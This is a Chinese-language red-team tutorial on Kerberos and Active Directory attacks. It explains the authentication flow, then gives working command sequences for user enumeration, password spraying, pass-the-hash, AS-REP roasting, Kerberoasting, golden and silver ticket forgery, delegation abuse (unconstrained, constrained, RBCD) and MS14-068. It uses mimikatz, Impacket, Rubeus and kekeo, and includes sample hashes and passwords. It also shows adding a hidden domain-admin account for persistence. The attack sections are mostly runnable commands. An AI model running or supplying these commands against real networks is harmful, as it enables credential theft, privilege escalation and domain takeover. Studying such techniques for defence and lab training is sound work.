+<p>kerberos是一种计算机网络认证协议，他能够为网络中通信的双方提供严格的身份验证服务，确保通信双方身份的真实性和安全性。</p>
+<p>在内网渗透中,Kerberos认证协议是基于票据的一种认证方式，可以分为三部分:用户(Client)、服务器(Server)和 KDC(Key Distribution Center,密钥分发中心)。KDC包含AS(Authentication Server，认证服务器)和TGS(Ticket Granting Server，票据授权服务器)。</p>
+<h3 data-content="1" id="2a6bd97946f1dde1a2332243baac5f39">Kerberos基础认证流程</h3>
+<p>其流程图如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241119000510-e2f5f9b6-a5c6-1.png"/></p>
+<p>认证流程解释：</p>
+<ol>
+<li>AS_REQ。CIient向AS发起AS_REQ，请求内容为通过Client的哈希加密的时间戳、ClientID 等内容。</li>
+<li>AS_REP。AS使用Client密码哈希值进行解密，如果解密正确，就返回用<strong>krbtgt的 NTLM-hash</strong> 加密的 <strong>TGT(Ticket Granting Ticket,票据授权凭证</strong>)票据。TGT 包含 PAC(Privilege Attribute Certificate，特权属证书)，PAC包含 Client的相关权限信息，如 SID及所在的组。简单理解，PAC就是用于验证用户权限，只有KDC能制作和查看PAC。</li>
+<li>TGS_REQ。Client 凭借 TGT向TGS 发起针对需要访问服务的 TGS_REQ 请求。</li>
+<li>TGS_REP。TGS 使用 krbtgt的 NTLM-hash对TGT 进行解密，如果结果正确，就返回用服务 NTLM-hash加密的<strong>TGS票据(简称 ST)</strong>，并带上PAC。注意，<strong>在Kerberos认证过程中，不论用户有没有访问服务的权限，只要TGT正确，就会返回ST</strong>。</li>
+<li>AP_REQ。Client利用ST去请求服务。</li>
+<li>AP_REP。服务使用自己的 NTLM-hash 解密 ST。如果解密正确，就会将其中的PAC 给KDC 解密，KDC由此判断Client是否有访问服务的权限。当然，<strong>如果没有设置PAC，就不会去KDC求证</strong>，这也是白银票据成功的原因。</li>
+</ol>
+<h2 data-content="1" id="4d9e2407342bbe6d4b1bd1e2958895fb">Kerberos攻击分类</h2>
+<p>Kerberos攻击其实可以归结为两个字:票据,即常说的<strong>票据传递攻击(Pass The Ticket,PTT)</strong>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241119000521-e9f60e2c-a5c6-1.png"/></p>
+<h2 data-content="1" id="3eeab8d6a2b6269156d9197ed3b2e8ca">AS_REQ&amp;AS_REP阶段攻击</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241119000533-f0d1ab70-a5c6-1.png"/></p>
+<h3 data-content="1" id="a09d94382d57de7f6bacee69c6a6fe30">域内用户枚举</h3>
+<p>当<strong>机器不在域中</strong>时，可以通过Kerberos的ASREQ工作原理来进行<strong>枚举域内账号</strong>，由于用户名存在跟不存在的报错不一致，域控会根据用户的真实状态返回相应的用户状态。所以当你拿到<strong>一堆用户名</strong>的时候，可以先进行一波枚举，如果都找出<strong>真实存在的域用户</strong>，再进行相应的域攻击</p>
+<p>如果我们在域内的话，直接执行命令查看域用户</p>
+<div class="highlight"><pre><span></span>net user <span class="o">/</span>domain  查看域用户
+</pre></div>
+<p>当受控靶机不在域内，但是同网段有域内机器<br/>
+可以使用<code>kerbrute</code>枚举域用户 <a href="https://github.com/ropnop/kerbrute" target="_blank">https://github.com/ropnop/kerbrute</a></p>
+<div class="highlight"><pre><span></span>proxychains <span class="m">.</span><span class="o">/</span>kerbrute_linux_amd64 userenum <span class="o">--</span>dc <span class="m">172.22.6.12</span> <span class="o">-</span>d xiaorang.lab username.txt <span class="o">-</span>t <span class="m">10</span>
+</pre></div>
+<p>或者<br/>
+EnumADUser.py</p>
+<div class="highlight"><pre><span></span>python2 EnumADUser.py <span class="m">192.168.200.143</span> <span class="m">0</span>day.org user.txt tcp
+</pre></div>
+<h3 data-content="1" id="046da3b9bb67de77d4f34694657d279b">密码喷洒攻击</h3>
+<p>和域用户枚举的思路大致相同，拿到一堆账号密码之后，可以使用相应的工具对于主机进行爆破处理，根据返回状态的不通判断此账号密码是否与对应的主机相匹配</p>
+<p>先用kerbrute拿到域内用户然后再喷洒</p>
+<div class="highlight"><pre><span></span>crackmapexec smb <span class="m">172.22.4.45</span> <span class="o">-</span>u username <span class="o">-</span>p passwd <span class="o">-</span>d domain <span class="m">2</span><span class="o">&amp;</span>gt<span class="p">;</span><span class="o">/</span>dev<span class="o">/</span>null
+
+proxychains4 crackmapexec smb <span class="m">172.22.9.1</span><span class="o">/</span><span class="m">24</span> <span class="o">-</span>u user.txt <span class="o">-</span>p pass.txt <span class="o">--</span>continue<span class="o">-</span>on<span class="o">-</span>success <span class="m">2</span><span class="o">&amp;</span>gt<span class="p">;</span><span class="o">/</span>dev<span class="o">/</span>null
+<span class="c1">#对c段进行枚举</span>
+proxychains <span class="o">-</span>q crackmapexec smb <span class="m">172.22.8.0</span><span class="o">/</span><span class="m">24</span> <span class="o">-</span>u <span class="s">'Aldrich'</span> <span class="o">-</span>p <span class="s">'Ald@rLMWuy7Z!#'</span>
+</pre></div>
+<h3 data-content="1" id="2d88ba94800f2b6b7cee17cfee5da0f7"><strong>哈希传递攻击</strong></h3>
+<p>哈希传递攻击是一种针对NTLM协议的攻击技术。在NTLM 身份认证的第三步中生成Response 时，客户端直接使用用户的NTLM 哈希值进行计算，用户的明文密码并不参与整个认证过程。也就是说，在Windows 系统中只使用用户哈希值对访问资源的用户进行身份认证。</p>
+<h4 data-content="1" id="309084e44ecb4187ed5c656034175b58">Mimikatz</h4>
+<p>MImikatz内置了哈希传递功能，需要管理员权限</p>
+<p>抓取域管理员哈希（本机用户）</p>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"privilege::debug"</span> <span class="s">"sekurlsa::logonpasswords full"</span> exit
+</pre></div>
+<p>利用抓取到的NTLM Hash进行哈希传递攻击</p>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"privilege::debug"</span> <span class="s">"sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab"</span> exit
+<span class="c1"># /user，指定要传递的用户名;/domain，指定当前所处域名或工作组名;/ntlm，指定用户哈希</span>
+</pre></div>
+<p>弹出一个新的命令行窗口，在新的命令行中具有域管理员权限</p>
+<h4 data-content="1" id="5d9d173357c71f8b6a94a21ae6de2c47">Impacket</h4>
+<p>该项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击<br/>
+比如：psexec.py、smbexec.py和wmiexec.py。</p>
+<p>smbexec.py：</p>
+<div class="highlight"><pre><span></span>python smbexec.py <span class="o">-</span>hashes <span class="o">:</span><span class="m">570</span>a9a65db8fba761c1008a51d4c95ab hack<span class="o">-</span>my.com<span class="o">/</span>administrator<span class="o">@</span><span class="m">10.10.10.19</span>
+<span class="c1"># python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span>
+<span class="c1"># -hashes，指定用户完整的哈希值，如果 LM Hash被废弃，就将其指定为0或为空</span>
+</pre></div>
+<h3 data-content="1" id="2ce1f2ba4057ec4a0aed47383a970b45">AS_REP Roasting攻击</h3>
+<p>当被攻击账号设置<strong>不需要Kerberos预身份验证</strong>后，在ASREP过程中就可以任意伪造用户名请求票据，此时域控不会进行任何验证就将<strong>TGT</strong>和该用户<strong>Hash加密</strong>的Login Session Key 返回，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat或是john对其破解，最终获得该用户的<strong>明文口令</strong></p>
+<p>使用impacket中的<code>GetNPUsers.py</code>来查找未设置预认证的账号，并获取他们的TGT，以hashcat能爆破的形式输出</p>
+<p>比如user.txt通过<strong>kerbrute</strong>获取</p>
+<div class="highlight"><pre><span></span>proxychains python3 GetNPUsers.py <span class="o">-</span>dc<span class="o">-</span>ip <span class="m">172.22.6.12</span> <span class="o">-</span>usersfile user.txt xiaorang.lab<span class="o">/</span> <span class="o">-</span>format hashcat
+</pre></div>
+<p>之后使用hashcat进行爆破</p>
+<div class="highlight"><pre><span></span>hashcat <span class="o">-</span>m <span class="m">18200</span> <span class="o">--</span>force <span class="o">-</span>a <span class="m">0</span> <span class="s">'$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:971802b84ce99050ad3c5f49d11fd0b7$xxxxxxxxxxxxx'</span> rockyou.txt
+<span class="c1">#-a 0 指定为字典爆破模式  </span>
+<span class="c1"># --force 忽略warning  </span>
+<span class="c1"># -m 18</span>
+<span class="m">200</span> 指定爆破模式为<span class="s">"Kerberos 5 AS-REP etype 23"</span><span class="p">(</span><span class="m">18200</span><span class="p">)</span>的格式
+</pre></div>
+<p>或者 john爆破</p>
+<div class="highlight"><pre><span></span>john user.txt
+</pre></div>
+<h3 data-content="1" id="2e050a5a251d95d1e3f707063a793de7">黄金票据</h3>
+<p>在Kerberos 认证中，每个用户的票据都是由 krbtgt的 NTLM 哈希值加密生成的，<strong>获得 krbtgt 的哈希值</strong>,便可以伪造任意用户的票据，这种攻击方式被称为黄金票据(GoldenTicket)。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241119000551-fbce6cd4-a5c6-1.png"/></p>
+<ul>
+<li>攻击需要这些信息：域名，域sid，krbtgt哈希值，伪造的用户。</li>
+</ul>
+<p>域sid查询自己的SID可以通过：<code>whoami /user</code></p>
+<p>查询其他用户的SID可以通过WMI查询：<code>wmic useraccount where name=%username% get sid</code></p>
+<p>SID的形式：S-1-5-21-&lt;域标识&gt;-&lt;相对标识&gt;</p>
+<ul>
+<li>“S-1”表示该标识是一个SID。</li>
+<li>“5”表示这是一个Windows服务器或域的标识。</li>
+<li>“21”是一个固定值，用于指示该SID是一个域SID。</li>
+<li>“&lt;域标识&gt;”是一个唯一的域标识符，用于标识特定的域。</li>
+<li>“&lt;相对标识&gt;”是一个相对于域的唯一的标识符，用于唯一标识域中的安全主体。</li>
+</ul>
+<p>常见的SID列表：</p>
+<ul>
+<li>S-1-5-18 (LocalSystem)</li>
+<li>S-1-5-19 (LocalService)</li>
+<li>S-1-5-20 (NetworkService)</li>
+<li>S-1-5-32-544 (Administrators)</li>
+<li>S-1-5-32-545 (Users)</li>
+<li>S-1-5-32-550 (PrintOperators)</li>
+</ul>
+<h4 data-content="1" id="dbf1305daf355c105f2fcd0dd7904152">黄金票据攻击</h4>
+<p>通常是在拿下<strong>域管</strong>之后，我们可以通过mimikatz等操作拿到krbtgt的哈希值，再通过其他组成票据的参数伪造票据</p>
+<ol>
+<li>在DC用mimikatz执行下面命令</li>
+</ol>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"Privilege::Debug"</span> <span class="s">"lsadump::lsa /patch"</span> <span class="s">"exit"</span>
+</pre></div>
+<p>假如得到如下信息：</p>
+<ul>
+<li>sid：S-1-5-21-1812960810-2335050734-3517558805</li>
+<li>ntlm hash：36f9d9e6d98ecf8307baf4f46ef842a2</li>
+<li>
+<p>aes256：dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9</p>
+</li>
+<li>
+<p>得到krbtgt的哈希值后，再利用mimikatz生成黄金票据</p>
+</li>
+</ul>
+<p>伪造用户administrator执行(aes256)</p>
+<div class="highlight"><pre><span></span>mimikatz <span class="s">"kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805/aes256:dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9 /user:administrator/ticket:gold.kirbi"</span>
+</pre></div>
+<p>或者伪造用户administrator执行(krbtgt hash)</p>
+<div class="highlight"><pre><span></span>mimikatz <span class="s">"</span><span class="err">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805/krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /user:administrator /ticket:gold.kirbi</span>
+</pre></div>
+<ol>
+<li>先清除票据防止干扰<div class="highlight"><pre><span></span>kerberos<span class="o">::</span>purge
+</pre></div>
+</li>
+<li>导入黄金票据 进行PTT<div class="highlight"><pre><span></span>kerberos<span class="o">::</span>ptt C<span class="o">:</span>\Users\jack.0DAY\Desktop\gold.kirbi
+</pre></div>
+</li>
+</ol>
+<p>&gt; 注意，跨域下的黄金票据有一定限制，但利用SidHistory 便可解决</p>
+<p>在普通域用户机器上，重新打开cmd窗口，可以直接列出域控目录</p>
+<div class="highlight"><pre><span></span>dir \\dc.college.com\<span class="kt">c</span><span class="o">$</span>
+<span class="c1">#dir \\计算机名.域名\c$</span>
+</pre></div>
+<p>可以直接使用psexec工具获得交互权限</p>
+<div class="highlight"><pre><span></span>PsExec64.exe \\dc.cyber.com <span class="o">-</span>s cmd.exe
+</pre></div>
+<p>也可以在域内创建隐藏用户。</p>
+<div class="highlight"><pre><span></span>net user qwerty<span class="o">$</span> Aa123456 <span class="o">/</span>add <span class="o">/</span>domain 
+ net group <span class="s">"domain admins"</span> qwerty<span class="o">$</span> <span class="o">/</span>domain
+</pre></div>
+<h2 data-content="1" id="5c7f67304abd170dad391449b183df47">TGS_REQ&amp;TGS_REP阶段攻击</h2>
+<h3 data-content="1" id="87fa3e32d1a608832f020b34f62a30f9">Kerberosast攻击</h3>
+<p>SPN(Service Principal Name，服务器主体名称)是服务器所运行服务的唯一标识，每个使用Kerberos 认证的服务都必须正确配置相应的 SPN，一个账户下可以有多个 SPN。根据权限，SPN有两种注册方式，分别为:机器账户 computers、域用户账户 users。</p>
+<p>任何一个域内账户都可以向DC查询所有域内用户对应的<strong>SPN</strong>并进行<strong>TGS交换</strong>过程，在<strong>KRB_TGS_REP</strong>过程将会返回查询到的用户的<strong>TGS tickets</strong>，然后我们即可使用爆破工具对于返回的票据进行爆破，获取对应明文</p>
+<p>如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。</p>
+<p>使用impacket的 GetUserSPNs.py来获得注册在<code>xiaorang.lab\liupeng</code>用户下的SPN的服务票据（ST）</p>
+<div class="highlight"><pre><span></span>python GetUserSPNs.py <span class="o">/:</span> <span class="o">-</span>dc<span class="o">-</span>ip  <span class="o">-</span>outputfile 
+<span class="c1">#proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/liupeng:fiAzGwEMgTY -outputfile hash.txt</span>
+</pre></div>
+<p>使用hashcat破解</p>
+<div class="highlight"><pre><span></span>hashcat64.exe <span class="o">-</span>m <span class="m">13100</span> hash.txt rockyou.txt
+</pre></div>
+<h3 data-content="1" id="8e8dcb29f0337b6d231ace22ba18e01d">白银票据攻击</h3>
+<p>如果在未配置 PAC 的情况下，服务的哈希被泄露，就可以伪造任何人的身份进入而没有检查，这种攻击称为白银票据(Silver Ticket)。其原理是通过伪造 ST 来访问服务,但是只能访问特定服务器上的部分服务。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241119000646-1c68fa86-a5c7-1.png"/></p>
+<p>在<strong>DC</strong>中以<strong>管理员权限</strong>用mimikatz获取<strong>DC机器名</strong>的哈希值：</p>
+<div class="highlight"><pre><span></span>mimikatz.exe log <span class="s">"privilege::debug"</span> <span class="s">"sekurlsa::logonpasswords"</span>
+</pre></div>
+<p>得到的域控制器的信息比如：</p>
+<div class="highlight"><pre><span></span>Username <span class="o">:</span> Administrator
+NTLM HASH：<span class="m">78</span>c403b6e04402158d26c5581f9e954b
+sid<span class="o">:</span>S<span class="m">-1-5-21-1218902331-2157346161-1782232778</span>
+</pre></div>
+<p>之后就可以生成伪造的 Silver Ticket 票据：（在不能访问DC的机器上执行）</p>
+<div class="highlight"><pre><span></span>kerberos<span class="o">::</span>golden <span class="o">/</span>domain<span class="o">:&amp;</span>lt<span class="p">;</span>域名<span class="o">&amp;</span>gt<span class="p">;</span> <span class="o">/</span>sid<span class="o">:&amp;</span>lt<span class="p">;</span>域 SID<span class="o">&amp;</span>gt<span class="p">;</span> <span class="o">/</span>target<span class="o">:&amp;</span>lt<span class="p">;</span>目标服务器主机名<span class="o">&amp;</span>gt<span class="p">;</span> <span class="o">/</span>service<span class="o">:&amp;</span>lt<span class="p">;</span>服务类型<span class="o">&amp;</span>gt<span class="p">;</span> <span class="o">/</span>rc4<span class="o">:</span> <span class="o">/</span>user<span class="o">:&amp;</span>lt<span class="p">;</span>伪造的用户名<span class="o">&amp;</span>gt<span class="p">;</span> <span class="o">/</span>ptt
+
+kerberos<span class="o">::</span>golden <span class="o">/</span>domain<span class="o">:</span>god.org <span class="o">/</span>sid<span class="o">:</span>S<span class="m">-1-5-21-1218902331-2157346161-1782232778</span>  <span class="o">/</span>target<span class="o">:</span>OWA2010CN<span class="o">-</span>God.god.org <span class="o">/</span>rc4<span class="o">:</span><span class="m">78</span>c403b6e04402158d26c5581f9e954b  <span class="o">/</span>service<span class="o">:</span>cifs <span class="o">/</span>user<span class="o">:</span>saul666 <span class="o">/</span>ptt
+</pre></div>
+<p>这个时候在</p>
+<div class="highlight"><pre><span></span>lsadump<span class="o">:</span>dcsync <span class="o">/</span>domain<span class="o">:</span>hack<span class="o">-</span>my.com <span class="o">/</span>user<span class="o">:</span>krbtgt
+</pre></div>
+<h2 data-content="1" id="14165e1dd3a72ae220751f8450f8dc46">委派攻击</h2>
+<p>在现实情况下，往往多个服务不可能在一台机器中，那么如果用户在使用服务A时，这时候需要服务B上属于自己的数据,最简单的方式就是A代用户去请求B返回相应的信息，这个过程就是委派。</p>
+<p>委派攻击分为非约束委派、约束委派、基于资源的约束委派三种。</p>
+<h3 data-content="1" id="d12500456f4741c52aaab081ee735355">非约束委派攻击</h3>
+<p>就是当 service1 的服务账户开启了非约束委派后，user 访问 service1 时，service1 会将user 的 TGT 保存在内存中，然后 servicel 就可以利用 TGT以 user 的身份去访问域中的任何user 可以访问的服务</p>
+<p>如果域管理员访问了开启非约束委派的服务，该服务所在的计算机就会<strong>保存域管理员的TGT在内存</strong>中，那么就可以获取其特权就可以获取域控权限。</p>
+<p>可以用adfind在域内查找非约束委派用户：</p>
+<div class="highlight"><pre><span></span>AdFind.exe <span class="o">-</span>b <span class="s">"DC=hack-my,DC=com"</span> <span class="o">-</span>f <span class="s">"(&amp;amp;(samAccountType =805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName
+</pre></div>
+<p>我们可以利用mimikatz查看内存中的票据</p>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"privilege::debug"</span> <span class="s">"sekurlsa::tickets /export"</span> <span class="s">"exit"</span>
+</pre></div>
+<p>可以利用<strong>Spooler打印机服务</strong>让域控主动连接在 Spooler 服务<strong>默认开启</strong>的情况下，域:户可以利用 Windows 打印系统远程协议(MS-RPRN)强制任何运行了 Spooler 服务的域内计算机通过Kerberos 或 NTLM 对任何目标进行身份验证，这便是该攻击方式的原理。</p>
+<p>攻击过程：</p>
+<ol>
+<li>以administrator身份打开cmd并执行Rubeus来监听</li>
+</ol>
+<div class="highlight"><pre><span></span>Rubeus.exe monitor <span class="o">/</span>interval<span class="o">:</span><span class="m">1</span> <span class="o">/</span>filteruser<span class="o">:</span>DC01<span class="o">$</span> <span class="o">&amp;</span>gt<span class="p">;</span>hash.txt
+<span class="c1"># /interval:1 设置监听间隔1秒  </span>
+<span class="c1"># /filteruser 监听对象为我们的域控，注意后面有个$</span>
+</pre></div>
+<ol>
+<li>
+<p>利用SpoolSample工具强制DC01对WEB2016进行认证</p>
+<div class="highlight"><pre><span></span>spoolsample.exe DC01 WEB2016
+</pre></div>
+</li>
+<li>
+<p>监听到的base64编码进行转换到正常的TGT，导入TGT</p>
+</li>
+</ol>
+<div class="highlight"><pre><span></span>kerberos<span class="o">::</span>purge <span class="c1">#清楚票据</span>
+kerberos<span class="o">::</span>ptt <span class="o">/</span>ticket<span class="o">:</span>base64 <span class="c1">#导入黄金票据</span>
+</pre></div>
+<ol>
+<li>利用mimikatz进行dcsync成功获取哈希值，制作黄金票据接管域控</li>
+</ol>
+<div class="highlight"><pre><span></span>lsadump<span class="o">::</span>dcsync <span class="o">/</span>domain<span class="o">:</span>sfang.com <span class="o">/</span>all <span class="o">/</span>csv
+</pre></div>
+<p>然后是使用PsExec进入交互</p>
+<div class="highlight"><pre><span></span>PsExec.exe  \\DC CMD
+</pre></div>
+<h3 data-content="1" id="daf4f7fc64723b402f17990b85d2f559">约束委派攻击</h3>
+<p>由于非约束委派的不安全，微软在winserver2003引入了约束委派，对Kerberos协议进行了拓展，引入了<strong>S4U协议</strong>：S4U2Self和S4U2proxy。</p>
+<p>委派过程：<br/>
+用户A访问service1<br/>
+service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以以用户A的身份进行操作。<br/>
+service1以用户A的身份访问KDC请求一个访问service2的可转发的ticket<br/>
+service1获取到ticket并以用户A的名义访问service2。</p>
+<p>查找约束委派机器</p>
+<div class="highlight"><pre><span></span>AdFind.exe <span class="o">-</span>b <span class="s">"DC=chu0,DC=time"</span> <span class="o">-</span>f <span class="s">"(&amp;amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> msds<span class="o">-</span>allowedtodelegateto
+</pre></div>
+<h4 data-content="1" id="80c5a2ff0e890644c79ba93063350cc8">利用方式一</h4>
+<p>利用条件</p>
+<ul>
+<li>获取管理员权限</li>
+<li>可获取被控机器账户票据</li>
+</ul>
+<p>导出票据（即获取自身服务票据）</p>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"privilege::debug"</span> <span class="s">"sekurlsa::tickets /export"</span> <span class="s">"exit"</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241119000705-27df09a0-a5c7-1.png"/></p>
+<p>使用kekeo将票据转发，并以域管权限获取目标服务票据</p>
+<div class="highlight"><pre><span></span>kekeo.exe <span class="s">"tgs::s4u /tgt:[0;3e7]-2-2-40e10000-WEB$@krbtgt-HAISHI.COM.kirbi /user:Administrator@haishi.com /service:cifs/DC.haishi.com"</span> <span class="s">"exit"</span>
+<span class="c1">#/user: 服务用户的用户名 /password: 服务用户的明文密码 /domain: 所在域名 /ticket: 指定票据名称，不过这个参数没有生效，可以忽略</span>
+</pre></div>
+<p>得到服务用户 TGT后导入票据</p>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"kerberos::purge"</span> <span class="s">"kerberos::ptt TGS_Administrator@haishi.com@HAISHI.COM_cifs~DC.haishi.com@HAISHI.COM.kirbi"</span> <span class="s">"exit"</span>
+
+<span class="c1">#长的名字就是票据的文件名</span>
+</pre></div>
+<p>或者<br/>
+用Rubeus 将得到 Base64 加密后的 TGT 票据</p>
+<div class="highlight"><pre><span></span>Rubeus.exe asktgt <span class="o">/</span>user<span class="o">:</span>MSSQLSERVER<span class="o">$</span> <span class="o">/</span>rc4<span class="o">:</span><span class="m">4250</span>ef4c15bfeb685371970e1be00b85 <span class="o">/</span>domain<span class="o">:</span>xiaorang.lab <span class="o">/</span>dc<span class="o">:</span>DC.xiaorang.lab <span class="o">/</span>nowrap
+</pre></div>
+<p>然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中</p>
+<div class="highlight"><pre><span></span>Rubeus.exe s4u <span class="o">/</span>impersonateuser<span class="o">:</span>Administrator <span class="o">/</span>msdsspn<span class="o">:</span>CIFS<span class="o">/</span>DC.xiaorang.lab <span class="o">/</span>dc<span class="o">:</span>DC.xiaorang.lab <span class="o">/</span>ptt <span class="o">/</span>ticket<span class="o">:</span>base64的数据
+</pre></div>
+<h4 data-content="1" id="d51bd56b9f3f59806fb32717e4b100c0">利用方式2</h4>
+<ul>
+<li>获取机器账户的hash</li>
+</ul>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"privilege::debug"</span> <span class="s">"sekurlsa::logonpasswords"</span> <span class="s">"exit"</span>
+</pre></div>
+<p>通过kekeo请求服务用户的TGT</p>
+<div class="highlight"><pre><span></span>tgt<span class="o">::</span>ask <span class="o">/</span>user<span class="o">:</span>websec <span class="o">/</span>domain<span class="o">:</span>redteam.club <span class="o">/</span>password<span class="o">:</span>pass<span class="o">@</span><span class="m">123</span> <span class="o">/</span>ticket<span class="o">:</span>test.kirbi  
+<span class="c1">#同理此处利用ntlm hash也是可以进行请求的  </span>
+tgt<span class="o">::</span>ask <span class="o">/</span>user<span class="o">:</span>websec <span class="o">/</span>domain<span class="o">:</span>redteam.club <span class="o">/</span>NTLM<span class="o">:</span>XXXXX
+</pre></div>
+<p>利用这个票据通过伪造S4U请求以administrator身份访问</p>
+<div class="highlight"><pre><span></span>kekeo.exe <span class="s">"tgs::s4u /tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi  </span>
+<span class="s">/user:Administrator@reteam.club /service:cifs/ad1.redteam.club"</span> <span class="s">"exit"</span>
+</pre></div>
+<p>然后导入票据</p>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s">"keberos::ptt  </span>
+<span class="s">TGS_Administrator@redteam.club@REDTEAM.CLUB_cifs~ad1.redteam.club@REDTEAM.CLUB.kirbi"</span> <span class="s">"exit"</span>
+</pre></div>
+<p>访问</p>
+<div class="highlight"><pre><span></span>dir \\DC.haishi.com\<span class="kt">c</span><span class="o">$</span>
+</pre></div>
+<h3 data-content="1" id="cd9dba84b86e8ddd28d17a0cde7ce202">基于资源的约束委派(RBCD)</h3>
+<p>基于资源的约束委派(Resource Based Constrained Delegation,RBCD)是在 WindowsServer 2012 中加入的功能,与传统约束委派相比,不需要域管理员权限去设置相关属性，而是将设置委派的权限交给了服务机器。</p>
+<p>例如从 Service A 到 Service B 的委派:</p>
+<p>&gt;传统的约束委派是正向的, 需要以域管的权限将 Service A 的 <code>msDS-AllowedToDelegateTo</code> 属性指定为 Service B.<br/>
+而基于资源的约束委派则是反向的, 无需域管权限, 只需要在 Service B 上将 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性指定为 Service A, 即可完成委派的配置.</p>
+<p>一般的情况是我们拿到一个域内的普通用户, 并且发现某台机器是通过该用户加入域的, 那么就可以通过 RBCD 在该机器上实现本地提权</p>
+<p>思路:</p>
+<ol>
+<li>利用可控域用户创建一个机器账户 (每个域用户默认可以创建 10 个机器账户, 即 <code>msDS-MachineAccountQuota (MAQ)</code> 属性)</li>
+<li>修改目标主机的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 使其指向新创建机器账户的 SID</li>
+<li>利用该机器账户的凭证通过 S4U 协议申请委派至目标主机的 ST 票据, 实现本地提权/横向移动</li>
+</ol>
+<p>AdFind 查询域内机器的 CreatorSID 属性</p>
+<div class="highlight"><pre><span></span>AdFind.exe -b <span class="s2">"DC=hack-my,DC=com"</span> -f <span class="s2">"objectClass=computer"</span> cn ms-DS-CreatorSID
+</pre></div>
+<p>发现 WIN2008-WEB 这台机器是通过 本机 加入域的, 那么 我们 就有权限修改它的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性</p>
+<p>首先利用 我们 账户在域内添加一个机器账户</p>
+<div class="highlight"><pre><span></span>addcomputer.py hack<span class="o">-</span>my.com<span class="o">/</span>Alice<span class="o">:</span><span class="s">'Alice123!'</span> <span class="o">-</span>computer<span class="o">-</span>name TEST\<span class="o">$</span> <span class="o">-</span>computer<span class="o">-</span>pass <span class="m">123456</span> <span class="o">-</span>dc<span class="o">-</span>host DC.hack<span class="o">-</span>my.com <span class="o">-</span>dc<span class="o">-</span>ip <span class="m">192.168.30.10</span>
+</pre></div>
+<p>然后配置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性</p>
+<div class="highlight"><pre><span></span>rbcd.py hack<span class="o">-</span>my.com<span class="o">/</span>Alice<span class="o">:</span><span class="s">'Alice123!'</span> <span class="o">-</span>dc<span class="o">-</span>ip <span class="m">192.168.30.10</span>  <span class="o">-</span>action write <span class="o">-</span>delegate<span class="o">-</span>to WIN2008<span class="o">-</span>WEB\<span class="o">$</span> <span class="o">-</span>delegate<span class="o">-</span>from TEST\<span class="o">$</span>
+</pre></div>
+<p>最后利用 S4U 协议伪造 Administrator 用户申请 ST</p>
+<div class="highlight"><pre><span></span>getST.py <span class="o">-</span>dc<span class="o">-</span>ip <span class="m">192.168.30.10</span> <span class="o">-</span>spn cifs<span class="o">/</span>WIN2008<span class="o">-</span>WEB.hack<span class="o">-</span>my.com <span class="o">-</span>impersonate Administrator hack<span class="o">-</span>my.com<span class="o">/</span>test\<span class="o">$:</span><span class="m">123456</span>
+
+export KRB5CCNAME<span class="o">=</span>Administrator.ccache
+psexec.py <span class="o">-</span>no<span class="o">-</span>pass <span class="o">-</span>k WIN2008<span class="o">-</span>WEB.hack<span class="o">-</span>my.com <span class="o">-</span>dc<span class="o">-</span>ip <span class="m">192.168.30.10</span>
+</pre></div>
+<h2 data-content="1" id="ff5fa9a8a16716104f1d999cc5fea8a5">PAC攻击</h2>
+<h3 data-content="1" id="ad1f960065def7108f5fdb5979190837">MS14-068</h3>
+<p>KDC 无法正确检查 PAC 中的有效签名，由于其实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证，因此可以利用不需要相关密钥的算法，如MD5，实现内容的任意更改，导致用户可以自己构造一张 PAC，伪造用户的 SID 和所在的组。那么，可以通过伪造 PAC，加入域管相关信息，访问域控服务，KDC会认为当前用户有权限，从而把这个用户当作域管组的成员，进而达到提升为域管理员的效果。</p>
+<p>利用kekeo 成功访问CIFS服务：</p>
+<div class="highlight"><pre><span></span>kekeo.exe <span class="s">"exploit::ms14068 /domain:hack-my.com /user:username /password:password /ptt"</span> <span class="s">"exit"</span>
+</pre></div>
